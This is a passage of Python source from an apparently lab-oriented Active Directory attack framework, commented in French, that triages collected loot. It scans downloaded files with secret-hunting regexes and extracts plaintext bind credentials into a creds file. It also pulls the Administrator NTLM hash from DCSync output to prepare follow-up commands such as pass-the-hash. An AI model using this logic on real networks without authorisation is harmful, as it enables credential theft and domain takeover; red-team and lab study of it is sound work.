                add(f"BloodHound : machines en délégation non contrainte, ex. {', '.join(unconstrained[:4])}.", f"bloodhound/{computers_files[0].name}", "high")
            if constrained:
                add(f"BloodHound : délégation contrainte détectée sur {len(constrained)} machine(s).", f"bloodhound/{computers_files[0].name}", "medium")
        except Exception:
            pass

    if domains_files:
        try:
            obj = json.loads(domains_files[0].read_text())
            dom = (obj.get("data") or [{}])[0]
            aces = dom.get("Aces") or []
            rights = sorted({str(a.get("RightName")) for a in aces if a.get("RightName")})
            if rights:
                add(f"BloodHound : droits domaine visibles dans l'export, ex. {', '.join(rights[:5])}.", f"bloodhound/{domains_files[0].name}", "medium")
        except Exception:
            pass

    if latest_zip or users_files or groups_files or computers_files or domains_files:
        add("BloodHound auto-review local terminé. Les shortest paths transverses et chemins multi-sauts nécessitent encore la GUI/Neo4j.", f"bloodhound/{latest_zip[0].name}" if latest_zip else "", "low")

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    review.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("text", "")))
    return review[:14]


def collect_looted_file_review(out_dir: Path) -> list[dict]:
    downloads_dir = out_dir / "downloads"
    if not downloads_dir.exists():
        return []

    findings: list[dict] = []
    text_suffixes = {
        ".txt", ".log", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
        ".ps1", ".bat", ".cmd", ".vbs", ".csv", ".md",
    }
    filename_bonus = [
        (re.compile(r"identity|sync|trace|auth|login|password|secret|token|cred|config|backup", re.I), 18, "Nom de fichier fortement lié à l'authentification, la synchronisation ou les secrets."),
        (re.compile(r"admin|service|svc|ldap|ad|domain|azure|entra", re.I), 10, "Le nom de fichier évoque l'AD, un compte de service ou un flux d'identité."),
    ]
    content_rules = [
        (re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*.+"), 32, "Présence d'une affectation de mot de passe potentiellement en clair."),
        (re.compile(r"(?i)(token|apikey|api[_-]?key|bearer|secret)\s*[:=]\s*.+"), 28, "Présence potentielle d'un secret applicatif ou jeton."),
        (re.compile(r"(?i)(user(name)?|login|account|samaccountname|userprincipalname)\s*[:=]\s*.+"), 16, "Présence de noms d'utilisateurs ou d'identifiants métier."),
        (re.compile(r"\\\\[A-Za-z0-9._$ -]+\\[A-Za-z0-9._$ -]+"), 12, "Présence de chemins UNC ou de références SMB réutilisables."),
        (re.compile(r"(?i)\b(?:ldap|ldaps|kerberos|sql|mssql|winrm|smb|http|https)://\S+"), 12, "Présence d'URL ou services pouvant ouvrir un nouveau pivot."),
        (re.compile(r"(?i)\b(?:CN=|OU=|DC=)[^,\r\n]+"), 8, "Présence de DN LDAP ou d'indices AD structurés."),
        (re.compile(r"(?i)\b[a-z0-9._-]+@[a-z0-9.-]+\.[a-z]{2,}\b"), 10, "Présence d'adresses mail ou d'UPN."),
    ]

    for fp in sorted(downloads_dir.rglob("*")):
        try:
            if not fp.is_file() or fp.stat().st_size <= 0 or fp.stat().st_size > 1024 * 1024:
                continue
        except Exception:
            continue
        if fp.suffix.lower() not in text_suffixes:
            continue

        rel = str(fp.relative_to(LOOT_DIR))
        name = fp.name
        text = safe_read_text(fp, 20000)
        if not text.strip():
            continue

        score = 0
        reasons: list[str] = []
        evidence: list[str] = []

        for regex, bonus, why in filename_bonus:
            if regex.search(name):
                score += bonus
                reasons.append(why)

        for regex, bonus, why in content_rules:
            m = regex.search(text)
            if m:
                score += bonus
                reasons.append(why)
                snippet = m.group(0).strip()
                if snippet and snippet not in evidence:
                    evidence.append(snippet[:140])

        hit_count = len(re.findall(r"(?i)password|passwd|pwd|token|secret|credential|user(name)?|admin|login", text))
        if hit_count >= 3:
            score += min(20, hit_count * 2)
            reasons.append(f"Le contenu contient plusieurs mots-clés sensibles ({hit_count} hits).")

        if score < 18:
            continue

        if score >= 65:
            severity = "critical"
        elif score >= 42:
            severity = "high"
        elif score >= 26:
            severity = "medium"
        else:
            severity = "low"

        impact = "Révision manuelle immédiate recommandée."
        if any("mot de passe" in r.lower() or "secret" in r.lower() for r in reasons):
            impact = "Peut contenir des credentials réutilisables ou des secrets directement exploitables."
        elif any("utilisateurs" in r.lower() or "identifiants" in r.lower() for r in reasons):
            impact = "Peut enrichir l'énumération AD et préparer spray, Kerberoast ou mouvements latéraux."
        elif any("pivot" in r.lower() or "services" in r.lower() for r in reasons):
            impact = "Peut révéler un nouveau service, chemin réseau ou flux d'authentification à exploiter."

        findings.append({
            "title": f"Fichier suspect: {name}",
            "text": f"{name} (score {score})",
            "path": rel,
            "severity": severity,
            "why": " ".join(dict.fromkeys(reasons))[:400],
            "impact": impact,
            "evidence": " | ".join(evidence[:3])[:420],
            "score": score,
        })

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    findings.sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), -int(item.get("score", 0)), item.get("path", "")))
    return findings[:15]


def extract_loot_structured_intel(out_dir: Path) -> dict:
    downloads_dir = out_dir / "downloads"
    intel = {
        "credentials": [],
        "hosts": [],
        "findings": [],
    }
    if not downloads_dir.exists():
        return intel

    text_suffixes = {
        ".txt", ".log", ".ini", ".conf", ".config", ".xml", ".json", ".yaml", ".yml",
        ".ps1", ".bat", ".cmd", ".vbs", ".csv", ".md",
    }
    # Extensions fréquemment captées par le pattern host et qui ne sont pas des hôtes.
    FILE_EXT_TOKENS = {
        "log", "ini", "conf", "config", "txt", "xml", "json", "yaml", "yml",
        "ps1", "ps2", "bat", "cmd", "vbs", "csv", "md", "dll", "exe", "bak",
        "tmp", "cfg", "reg", "pem", "pfx", "crt", "key", "lnk", "url", "db",
    }
    # Domaines publics à ignorer (pollution classique dans les logs).
    PUBLIC_DOMAINS = {
        "github.com", "gitlab.com", "bitbucket.org", "gmail.com", "google.com",
        "googleapis.com", "microsoft.com", "office.com", "outlook.com",
        "windows.com", "live.com", "microsoftonline.com", "azure.com",
        "schemas.microsoft.com", "wikipedia.org", "example.com", "localhost",
    }
    # TLD internes raisonnables pour un AD.
    INTERNAL_TLDS = {"htb", "local", "corp", "internal", "intra", "lab", "loc", "lan", "test"}
    # Préfixes de classes .NET ou namespaces à éliminer.
    NAMESPACE_PREFIXES = ("system.", "microsoft.", "mscorlib.", "java.", "com.sun.", "org.apache.")
    target_domain = str(getattr(out_dir, "name", "") or "").strip().lower()

    def looks_like_host(raw: str) -> bool:
        if not raw or raw.startswith("_") or raw.count(".") == 0:
            return False
        parts = raw.split(".")
        last = parts[-1]
        if last in FILE_EXT_TOKENS:
            return False
        if raw in PUBLIC_DOMAINS:
            return False
        if any(raw.endswith("." + d) for d in PUBLIC_DOMAINS):
            return False
        if raw.startswith(NAMESPACE_PREFIXES):
            return False
        # Si le domaine cible est connu (typique HTB), on exige ce suffixe : filtre le plus fiable.
        if target_domain and "." in target_domain:
            return raw == target_domain or raw.endswith("." + target_domain)
        # Sinon on accepte les TLD internes reconnus.
        if last in INTERNAL_TLDS:
            return True
        # Sinon on limite à 2-3 segments avec un TLD court alpha pour écarter les namespaces .NET.
        return len(parts) <= 3 and bool(re.match(r"^[a-z]{2,4}$", last))

    seen_creds: set[tuple[str, str, str]] = set()
    seen_hosts: set[str] = set()
    seen_findings: set[tuple[str, str, str]] = set()

    def add_cred(user: str, password: str = "", note: str = "", path: str = "", evidence: str = "") -> None:
        user = str(user or "").strip()
        password = str(password or "").strip()
        if not user or (not password and not note):
            return
        key = (user.lower(), password, path)
        if key in seen_creds:
            return
        seen_creds.add(key)
        intel["credentials"].append({
            "user": user,
            "pass": password,
            "hash": "",
            "note": note.strip(),
            "path": path,
            "evidence": evidence.strip()[:220],
            "source": "loot_log",
        })

    def add_host(host: str, info: str = "", path: str = "", evidence: str = "") -> None:
        raw = str(host or "").strip().strip(".,;:()[]{}\"'")
        if not raw:
            return
        if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw):
            key = raw
        else:
            raw = raw.lower()
            if not looks_like_host(raw):
                return
            key = raw
        if key in seen_hosts:
            return
        seen_hosts.add(key)
        intel["hosts"].append({
            "host": raw if not re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw) else "",
            "ip": raw if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", raw) else "",
            "source": "loot_log",
            "info": info.strip()[:160],
            "path": path,
            "evidence": evidence.strip()[:220],
        })

    def add_finding(title: str, *, path: str = "", severity: str = "medium", why: str = "", impact: str = "", evidence: str = "") -> None:
        title = str(title or "").strip()
        if not title:
            return
        key = (title, path, evidence[:80])
        if key in seen_findings:
            return
        seen_findings.add(key)
        intel["findings"].append({
            "title": title,
            "text": title,
            "path": path,
            "severity": severity,
            "why": why.strip(),
            "impact": impact.strip(),
            "evidence": evidence.strip()[:300],
            "source": "loot_log",
        })

    host_pat = re.compile(r"\b(?:[A-Za-z0-9_-]+\.)+[A-Za-z]{2,}\b")

    for fp in sorted(downloads_dir.rglob("*")):
        try:
            if not fp.is_file() or fp.stat().st_size <= 0 or fp.stat().st_size > 1024 * 1024:
                continue
        except Exception:
            continue
        if fp.suffix.lower() not in text_suffixes:
            continue

        rel = str(fp.relative_to(LOOT_DIR))
        text = safe_read_text(fp, 40000)
        if not text.strip():
            continue

        for match in re.finditer(
            r'BindUser:\s*"([^"]+)"\s*,\s*BindPass:\s*"([^"]+)"',
            text,
            re.IGNORECASE,
        ):
            bind_user = match.group(1).strip()
            bind_pass = match.group(2).strip()
            user_short = bind_user.split("\\", 1)[-1].split("@", 1)[0]
            snippet = match.group(0).strip()
            add_cred(
                user_short,
                bind_pass,
                note=f"Creds exposés dans {fp.name} via BindUser/BindPass",
                path=rel,
                evidence=snippet,
            )
            add_finding(
                f"Credentials en clair trouvés dans {fp.name}: {user_short}",
                path=rel,
                severity="critical",
                why="Le log expose directement un compte et son mot de passe en clair.",
                impact="Réutilisation immédiate possible pour LDAP, SMB, Kerberos, WinRM ou BloodHound.",
                evidence=snippet,
            )

        for match in re.finditer(r"Connectivity failed for\s+([^\s.]+)", text, re.IGNORECASE):
            acct = match.group(1).strip().strip(".")
            if acct:
                add_finding(
                    f"Compte de service observé dans un flux LDAP: {acct}",
                    path=rel,
                    severity="medium",
                    why="Le log montre qu'un compte de service est utilisé pour un bind LDAP applicatif.",
                    impact="Compte prioritaire à tester ou suivre dans BloodHound/LDAP.",
                    evidence=match.group(0),
                )

        for match in re.finditer(r"Establishing SQL session with\s+([A-Za-z0-9._-]+\.[A-Za-z0-9.-]+)", text, re.IGNORECASE):
            host = match.group(1)
            add_host(host, info="Serveur SQL mentionné dans un log d'application", path=rel, evidence=match.group(0))
            add_finding(
                f"Backend SQL interne identifié: {host}",
                path=rel,
                severity="medium",
                why="Le log décrit une connexion applicative vers un serveur SQL interne.",
                impact="Pivot potentiel MSSQL, collecte d'info métier et mouvement latéral vers un hôte applicatif.",
                evidence=match.group(0),
            )

        for match in re.finditer(r"Validating AD target health:\s+([A-Za-z0-9._-]+\.[A-Za-z0-9.-]+)\s+\(Port\s+(\d+)\)", text, re.IGNORECASE):
            host = match.group(1)
            port = match.group(2)
            add_host(host, info=f"Cible AD/LDAP observée dans un log (port {port})", path=rel, evidence=match.group(0))
            add_finding(
                f"Cible AD interne identifiée: {host}:{port}",
                path=rel,
                severity="medium",
                why="Le log confirme le contrôleur ou point LDAP utilisé par le service.",
                impact="Cible prioritaire pour LDAP, BloodHound et tests de credentials.",
                evidence=match.group(0),
            )

        for match in re.finditer(r"\b([A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,})\b", text):
            email = match.group(1).strip()
            if email.lower().endswith(".local"):
                continue
            add_finding(
                f"Adresse mail interne observée: {email}",
                path=rel,
                severity="low",
                why="Le log contient une adresse mail interne ou de notification.",
                impact="Peut enrichir les utilisateurs cibles, conventions de nommage et surfaces applicatives.",
                evidence=match.group(0),
            )

        for host in host_pat.findall(text):
            add_host(host, info=f"Hôte observé dans {fp.name}", path=rel, evidence=host)

    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    intel["findings"].sort(key=lambda item: (order.get(item.get("severity", "medium"), 9), item.get("title", "")))
    intel["credentials"] = intel["credentials"][:12]
    intel["hosts"] = intel["hosts"][:24]
    intel["findings"] = intel["findings"][:18]
    return intel


def merge_auto_creds(out_dir: Path, credentials: list[dict]) -> int:
    creds_path = out_dir / "creds.json"
    try:
        existing = json.loads(creds_path.read_text()) if creds_path.exists() else []
    except Exception:
        existing = []
    existing_keys = {
        (
            str(item.get("user", "")).strip().lower(),
            str(item.get("pass", "")).strip(),
            str(item.get("hash", "")).strip().lower(),
        )
        for item in existing if isinstance(item, dict)
    }
    added = 0
    for cred in credentials or []:
        if not isinstance(cred, dict):
            continue
        key = (
            str(cred.get("user", "")).strip().lower(),
            str(cred.get("pass", "")).strip(),
            str(cred.get("hash", "")).strip().lower(),
        )
        if not key[0] or key in existing_keys:
            continue
        existing_keys.add(key)
        new_item = {
            "id": str(int(time.time() * 1000) + added),
            "user": str(cred.get("user", "")).strip(),
            "pass": str(cred.get("pass", "")).strip(),
            "hash": str(cred.get("hash", "")).strip(),
            "note": str(cred.get("note", "") or f"Auto-import depuis {cred.get('path', 'loot')}").strip(),
            "source": str(cred.get("source", "loot_log")).strip(),
            "path": str(cred.get("path", "")).strip(),
            "evidence": str(cred.get("evidence", "")).strip()[:220],
        }
        existing.append(new_item)
        added += 1
    if added:
        creds_path.write_text(json.dumps(existing, indent=2))
    return added


def collect_detail_sections(out_dir: Path) -> list[dict]:
    sections: list[dict] = []

    def normalize_detail_item(item):
        if isinstance(item, dict):
            text = str(item.get("text", "")).strip()
            if not text:
                return None
            normalized = {"text": text}
            if item.get("path"):
                normalized["path"] = str(item.get("path")).strip()
            return normalized
        text = str(item or "").strip()
        return {"text": text} if text else None

    def add_section(key: str, title: str, items: list) -> None:
        cleaned = [normalize_detail_item(it) for it in items]
        cleaned = [it for it in cleaned if it]
        if cleaned:
            sections.append({"key": key, "title": title, "items": cleaned[:18]})

    # Politique du domaine
    policy_items: list[str] = []
    ldap_pol = out_dir / "ldap_passpol.txt"
    if ldap_pol.exists():
        txt = safe_read_text(ldap_pol, 12000)
        kv = {}
        for k in ("minPwdLength", "pwdHistoryLength", "maxPwdAge", "lockoutThreshold", "lockoutDuration"):
            m = re.search(rf"^{re.escape(k)}:\s+(.+)$", txt, re.MULTILINE)
            if m:
                kv[k] = m.group(1).strip()
        if kv:
            policy_items.append(f"Longueur mini: {kv.get('minPwdLength', '?')}")
            policy_items.append(f"Historique: {kv.get('pwdHistoryLength', '?')}")
            policy_items.append(f"Âge max mot de passe: {kv.get('maxPwdAge', '?')}")
            policy_items.append(f"Seuil de lockout: {kv.get('lockoutThreshold', '?')}")
            policy_items.append(f"Durée lockout: {kv.get('lockoutDuration', '?')}")
    domain_pol = out_dir / "ldapdomaindump" / "domain_policy.json"
    if domain_pol.exists():
        try:
            obj = json.loads(domain_pol.read_text())
            if obj and isinstance(obj, list):
                attrs = obj[0].get("attributes", {}) or {}
                if attrs.get("msDS-Behavior-Version"):
                    policy_items.append(f"Niveau fonctionnel AD: {attrs['msDS-Behavior-Version'][0]}")
                if attrs.get("ms-DS-MachineAccountQuota"):
                    policy_items.append(f"MachineAccountQuota: {attrs['ms-DS-MachineAccountQuota'][0]}")
                if attrs.get("lockoutThreshold"):
                    policy_items.append(f"LockoutThreshold (ldapdomaindump): {attrs['lockoutThreshold'][0]}")
        except Exception:
            pass
    add_section("policy", "Politique Domaine", policy_items)

    # DNS / DC
    dns_items: list[str] = []
    for rel, label in (
        ("dns_enum/srv_ldap_dc.txt", "LDAP SRV"),
        ("dns_enum/srv_kerberos.txt", "Kerberos SRV"),
        ("dns_enum/dc_a.txt", "DC A"),
        ("dns_enum/host_srv_ldap.txt", "host ldap"),
        ("dns_enum/host_srv_kerberos.txt", "host kerberos"),
    ):
        fp = out_dir / rel
        if fp.exists():
            lines = [ln.strip() for ln in safe_read_text(fp, 4000).splitlines() if ln.strip()]
            if lines:
                dns_items.append(f"{label}: {lines[0]}")
    add_section("dns", "DNS & Contrôleur de Domaine", dns_items)

    # Ports ouverts
    port_items: list[str] = []
    nmap_f = out_dir / "nmapresult.txt"
    if nmap_f.exists():
        port_entries = _parse_open_ports(nmap_f)
        ports = [p["raw"] for p in port_entries]
        if ports:
            port_items.append(f"Total ports ouverts: {len(ports)}")
            nonstd = [p for p in port_entries if p["nonstandard"]]
            if nonstd:
                port_items.append("Ports non standard: " + " | ".join(f"{p['port']} ({p['service']})" for p in nonstd[:8]))
            for entry in port_entries[:16]:
                suffix_parts = []
                if entry["service"]:
                    suffix_parts.append(entry["service"])
                if entry.get("product"):
                    suffix_parts.append(entry["product"])
                if entry["nonstandard"]:
                    suffix_parts.append("non standard")
                port_items.append(f"{entry['port']}" + (f" [{' | '.join(suffix_parts)}]" if suffix_parts else ""))
                for detail in (entry.get("details") or [])[:3]:
                    port_items.append(f"  · {detail}")
    add_section("ports", "Ports ouverts", port_items)

    # SMB / RPC
    smb_items: list[str] = []
    rpc_pol = out_dir / "rpc_passpol.txt"
    if rpc_pol.exists():
        txt = safe_read_text(rpc_pol, 4000)
        for pat, label in (
            (r"min_password_length:\s*(.+)", "Longueur mini RPC"),
            (r"password_properties:\s*(.+)", "Password properties"),
        ):
            m = re.search(pat, txt, re.MULTILINE)
            if m:
                smb_items.append(f"{label}: {m.group(1).strip()}")
    users_auth = out_dir / "rpc_users_auth.txt"
    if users_auth.exists():
        lines = [ln.strip() for ln in safe_read_text(users_auth, 8000).splitlines() if ln.strip()]
        if lines:
            smb_items.append(f"Utilisateurs RPC auth: {len(lines)}")
    shares = out_dir / "parsed" / "nxc_smb_shares.json"
    if shares.exists():
        try:
            data = json.loads(shares.read_text())
            preview = data.get("output_preview", "")
            matches = re.findall(r"^\s*([A-Z0-9$._-]+)\s+(READ|WRITE|READ,WRITE)?\s{2,}(.+)?$", preview, re.MULTILINE)
            if matches:
                parts = []
                for name, perm, remark in matches[:6]:
                    if name in {"SMB", "Share", "-----"}:
                        continue
                    suffix = []
                    if perm:
                        suffix.append(perm)
                    if remark:
                        suffix.append(remark.strip())
                    parts.append(name + (f" ({' / '.join(suffix)})" if suffix else ""))
                if parts:
                    smb_items.append("Partages: " + " | ".join(parts))
        except Exception:
            pass
    smbclient_list = out_dir / "parsed" / "smbclient_list.json"
    if smbclient_list.exists():
        try:
            data = json.loads(smbclient_list.read_text())
            preview = data.get("output_preview", "")
            matches = []
            for line in preview.splitlines():
                m = re.match(r"^\s*([A-Z0-9$._-]+)\s+(Disk|IPC)\s+(.+)$", line.strip())
                if m and m.group(1) not in {"Sharename", "---------"}:
                    matches.append(f"{m.group(1)} ({m.group(2)} / {m.group(3).strip()})")
            if matches:
                smb_items.append("smbclient: " + " | ".join(matches[:6]))
        except Exception:
            pass
    signing = out_dir / "attack_checks" / "smb_signing_check.txt"
    if signing.exists():
        txt = safe_read_text(signing, 4000)
        if re.search(r"signing[:=]\s*false|disabled", txt, re.IGNORECASE):
            smb_items.append("SMB signing désactivé")
        elif re.search(r"signing[:=]\s*true|required", txt, re.IGNORECASE):
            smb_items.append("SMB signing requis")
    add_section("smb", "SMB / RPC", smb_items)

    # BloodHound
    bh_items: list[str] = []
    bh_dir = out_dir / "bloodhound"
    if bh_dir.exists():
        latest_domains = sorted([p for p in bh_dir.glob("*_domains.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
        latest_users = sorted([p for p in bh_dir.glob("*_users.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
        latest_groups = sorted([p for p in bh_dir.glob("*_groups.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
        latest_computers = sorted([p for p in bh_dir.glob("*_computers.json") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
        latest_zip = sorted([p for p in bh_dir.glob("*.zip") if p.stat().st_size > 0], key=lambda p: p.stat().st_mtime, reverse=True)
        if latest_zip:
            bh_items.append(f"Zip BloodHound: {latest_zip[0].name}")
        if latest_domains:
            try:
                obj = json.loads(latest_domains[0].read_text())
                dom = (obj.get("data") or [{}])[0]
                props = dom.get("Properties", {}) or {}
                if props.get("name"):
                    bh_items.append(f"Domaine BloodHound: {props['name']}")
                if props.get("functionallevel"):
                    bh_items.append(f"Niveau fonctionnel BloodHound: {props['functionallevel']}")
                aces = dom.get("Aces") or []
                rights = sorted({a.get("RightName") for a in aces if a.get("RightName")})
                if rights:
                    bh_items.append("Droits domaine (extraits): " + " | ".join(rights[:6]))
            except Exception:
                pass
        if latest_users:
            try:
                obj = json.loads(latest_users[0].read_text())
                count = (obj.get("meta") or {}).get("count")
                if count:
                    bh_items.append(f"Comptes BloodHound: {count}")
            except Exception:
                pass
        if latest_groups:
            try:
                obj = json.loads(latest_groups[0].read_text())
                count = (obj.get("meta") or {}).get("count")
                if count:
                    bh_items.append(f"Groupes BloodHound: {count}")
            except Exception:
                pass
        if latest_computers:
            try:
                obj = json.loads(latest_computers[0].read_text())
                count = (obj.get("meta") or {}).get("count")
                if count:
                    bh_items.append(f"Postes BloodHound: {count}")
            except Exception:
                pass
    add_section("bloodhound", "BloodHound", bh_items)

    # WinRM
    winrm_items: list[str] = []
    winrm_5985 = out_dir / "attack_checks" / "winrm_wsman_5985_headers.txt"
    if winrm_5985.exists():
        txt = safe_read_text(winrm_5985, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            winrm_items.append("WSMan HTTP (5985) répond")
    winrm_5986 = out_dir / "attack_checks" / "winrm_wsman_5986_headers.txt"
    if winrm_5986.exists():
        txt = safe_read_text(winrm_5986, 6000)
        if re.search(r"HTTP/1|Server:|WinRM", txt, re.IGNORECASE):
            winrm_items.append("WSMan HTTPS (5986) répond")
    winrm_auth = out_dir / "attack_checks" / "winrm_auth_test.txt"
    if winrm_auth.exists():
        txt = safe_read_text(winrm_auth, 12000)
        if re.search(r"(\[\+\]|Pwn3d|valid|authenticated|success)", txt, re.IGNORECASE):
            winrm_items.append("Authentification WinRM valide via nxc")
        else:
            errs = [ln.strip() for ln in txt.splitlines() if ln.strip()][:3]
            winrm_items.extend(errs[:2])
    winrm_hint = out_dir / "winrm_enum" / "connection_hint.txt"
    if winrm_hint.exists():
        lines = [ln.strip() for ln in safe_read_text(winrm_hint, 8000).splitlines() if ln.strip()]
        if lines:
            winrm_items.append("Hint evil-winrm disponible")
            for line in lines:
                if line.lower().startswith("hint:"):
                    winrm_items.append(line)
                    break
    add_section("winrm", "WinRM", winrm_items)

    # ADCS
    adcs_items: list[str] = []
    certipy = out_dir / "adcs" / "certipy_find.log"
    if certipy.exists():
        txt = safe_read_text(certipy, 12000)
        for pat, label in (
            (r"CA Name\s+:\s+(.+)", "CA"),
            (r"DNS Name\s+:\s+(.+)", "CA DNS"),
            (r"Enabled\s+:\s+(False|True)", "Web Enrollment HTTP"),
        ):
            m = re.search(pat, txt)
            if m:
                adcs_items.append(f"{label}: {m.group(1).strip()}")
        if "Could not retrieve configuration" in txt:
            adcs_items.append("Configuration CA non récupérée via RRP")
        if "Could not find any certificate templates" in txt:
            adcs_items.append("Templates non récupérés par Certipy")
    add_section("adcs", "ADCS / Certipy", adcs_items)

    # Délégations / ACL
    del_items: list[str] = []
    for rel, label in (
        ("ldap_unconstrained_delegation.txt", "Unconstrained delegation"),
        ("ldap_constrained_delegation.txt", "Constrained delegation"),
        ("ldap_rbcd_candidates.txt", "RBCD"),
        ("bloodyad/writable.txt", "Objets avec écritures"),
    ):
        fp = out_dir / rel
        if not fp.exists():
            continue
        txt = safe_read_text(fp, 12000)
        if rel.endswith("writable.txt"):
            dns = re.findall(r"^distinguishedName:\s+(.+)$", txt, re.MULTILINE)
            if dns:
                del_items.append(f"{label}: {len(dns)} objet(s)")
                del_items.extend(f"Writable: {dn}" for dn in dns[:3])
        else:
            lines = [ln.strip() for ln in txt.splitlines() if ln.strip() and not ln.startswith("#")]
            if lines:
                del_items.append(f"{label}: {len(lines)} ligne(s)")
                del_items.extend(lines[:3])
    add_section("delegation", "Délégation & ACL", del_items)

    # GPO
    gpo_items: list[dict] = []
    for rel, label in (
        ("gpo/gpp_candidates.txt", "GPP candidates"),
        ("gpo/logon_scripts.txt", "Scripts de logon"),
        ("gpo/scheduled_tasks.txt", "Tâches planifiées"),
    ):
        fp = out_dir / rel
        if fp.exists():
            lines = [ln.strip() for ln in safe_read_text(fp, 12000).splitlines() if ln.strip()]
            if lines:
                gpo_items.append({"text": f"{label}: {len(lines)}", "path": rel})
                gpo_items.extend({"text": line, "path": rel} for line in lines[:3])
    add_section("gpo", "GPO / SYSVOL", gpo_items)

    # Secretsdump / hash / post-auth
    sec_items: list[str] = []
    dcsync = out_dir / "attack_checks" / "secretsdump_dcsync.txt"
    if dcsync.exists():
        txt = safe_read_text(dcsync, 8000)
        hashes = re.findall(r"^([^:\n]+):\d+:[0-9a-f]{32}:[0-9a-f]{32}", txt, re.IGNORECASE | re.MULTILINE)
        if hashes:
            sec_items.append(f"Hashes DCSync: {len(hashes)}")
        if "ERROR_DS_DRA_BAD_DN" in txt:
            sec_items.append("DCSync: échec DRSUAPI (distinguishedName invalide)")
        if "Something went wrong with the DRSUAPI approach" in txt:
            sec_items.append("DCSync: l'approche DRSUAPI a échoué")
        if re.search(r"\b-use-vss\b", txt, re.IGNORECASE):
            sec_items.append("Piste alternative: retenter secretsdump avec -use-vss")
        errs = [ln.strip() for ln in txt.splitlines() if "ERROR_DS_DRA_BAD_DN" in ln or "Something went wrong" in ln]
        sec_items.extend(errs[:2])
    hints = out_dir / "attack_checks" / "postauth_hints.txt"
    if hints.exists():
        lines = [ln.strip() for ln in safe_read_text(hints, 8000).splitlines() if ln.strip()]
        sec_items.extend(lines[:4])
    add_section("postauth", "Post-auth / Secrets", sec_items)

    return sections


def collect_operational_view(out_dir: Path, domain: str, summary: dict) -> dict:  # noqa: C901
    ops: dict[str, list] = {
        "decision_now": [],
        "current_state": [],
        "priorities": [],
        "target_accounts": [],
        "attack_paths": [],
        "next_commands": [],
        "warnings": [],
    }

    def add(bucket: str, item: str | dict, path: str = "") -> None:
        if isinstance(item, dict):
            text = str(item.get("text", "")).strip()
            if not text:
                return
            entry = {"text": text}
            if item.get("path"):
                entry["path"] = str(item.get("path")).strip()
        else:
            text = str(item or "").strip()
            if not text:
                return
            entry = {"text": text}
            if path:
                entry["path"] = path.strip()
        if entry not in ops[bucket]:
            ops[bucket].append(entry)

    def add_decision(title: str, why: str, cmds: list[str] | None = None, score: str = "high") -> None:
        entry = {
            "title": title.strip(),
            "why": why.strip(),
            "score": score,
            "cmds": [],
        }
        for cmd in (cmds or [])[:3]:
            item = build_operational_command(cmd, auth_user=auth_user, auth_pass=auth_pass, admin_hash=admin_hash)
            if item.get("cmd"):
                entry["cmds"].append(item)
        if entry not in ops["decision_now"]:
            ops["decision_now"].append(entry)

    # ── resolve IP / DC ──────────────────────────────────────────────────────
    target = ""
    for _m in summary.get("machines", []):
        if _m.get("ip"):
            target = _m["ip"]
            break
    ip = target or "TARGET_IP"
    dom = domain or "domain.local"
    dc = ""
    for _m in summary.get("machines", []):
        _h = (_m.get("host") or "").lower()
        # skip SRV-style DNS records (_ldap._tcp.dc._msdcs.*)
        if _h.startswith("_"):
            continue
        if _h.startswith("dc") or re.search(r"\bdc\d*\.", _h):
            dc = _m.get("host") or ""
            break
    # fallback: extract DC hostname from ntp_sync loot
    if not dc:
        ntp_f2 = out_dir / "attack_checks" / "ntp_sync.txt"
        if ntp_f2.exists():
            _nt = safe_read_text(ntp_f2, 2000)
            _dcm = re.search(r"(dc\d*\.\S+\.\S+)", _nt, re.IGNORECASE)
            if _dcm and not _dcm.group(1).startswith("_"):
                dc = _dcm.group(1).strip()
    if not dc:
        dc = f"dc01.{dom}"

    # ── extract real creds from SMB auth loot ────────────────────────────────
    auth_user = ""
    auth_pass = ""
    smb_auth_f = out_dir / "attack_checks" / "smb_auth_test.txt"
    if smb_auth_f.exists():
        _txt = safe_read_text(smb_auth_f, 8000)
        _m = re.search(r"\[\+\]\s+\S+\\([^:\s]+):(.+)", _txt)
        if _m:
            auth_user = _m.group(1).strip()
            auth_pass = _m.group(2).strip()
    winrm_f = out_dir / "attack_checks" / "winrm_auth_test.txt"
    winrm_ok = winrm_f.exists() and bool(re.search(r"\[\+\]", safe_read_text(winrm_f, 2000)))

    def _u() -> str:
        return auth_user or "USER"

    def _p() -> str:
        return auth_pass or "PASS"

    def add_cmd(command: str) -> None:
        item = build_operational_command(command, auth_user=auth_user, auth_pass=auth_pass, admin_hash=admin_hash)
        if item["cmd"] and item not in ops["next_commands"]:
            ops["next_commands"].append(item)

    anomaly_items = summary.get("anomalies") or []
    bh_review_items = summary.get("bloodhound_review") or []
    loot_hunt_items = summary.get("loot_hunt") or []

    # ── SAM / DCSync loot ────────────────────────────────────────────────────
    dcsync_f = out_dir / "attack_checks" / "secretsdump_dcsync.txt"
    sam_f = out_dir / "attack_checks" / "secretsdump_sam.txt"
    admin_hash = ""
    dcsync_txt = ""
    if dcsync_f.exists():
        dcsync_txt = safe_read_text(dcsync_f, 16000)
        _m = re.search(r"Administrator:[^:]*:[0-9a-f]{32}:([0-9a-f]{32})", dcsync_txt, re.IGNORECASE)
        if _m:
            admin_hash = _m.group(1)
    if sam_f.exists() and not admin_hash:
        _m = re.search(r"Administrator:[^:]*:[0-9a-f]{32}:([0-9a-f]{32})", safe_read_text(sam_f, 8000), re.IGNORECASE)
        if _m:
            admin_hash = _m.group(1)
    pth_hashes: list[tuple[str, str]] = []
    if dcsync_txt:
        for _hm in re.finditer(r"([\w\-\$]+):[^:]*:[0-9a-f]{32}:([0-9a-f]{32})", dcsync_txt, re.IGNORECASE):
